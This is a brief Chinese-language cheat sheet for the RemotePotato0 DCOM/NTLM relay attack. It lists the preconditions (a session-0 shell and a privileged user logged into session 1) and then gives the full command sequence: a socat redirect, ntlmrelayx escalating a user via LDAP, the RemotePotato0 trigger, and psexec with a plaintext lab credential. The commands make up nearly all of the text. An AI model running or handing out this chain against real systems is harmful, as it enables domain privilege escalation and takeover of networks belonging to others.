	RemotePotato0 DCOM DCE RPC 中继
	滥用 DCOM 激活服务并触发当前登录到目标计算机的用户的 NTLM 身份验证
	要求：
	会话 0 中的 shell（例如 WinRm shell 或 SSH shell）
	特权用户在会话 1 中登录（例如域管理员用户）
	https://github.com/antonioCoco/RemotePotato0/
	Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
	Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
	Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
	Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'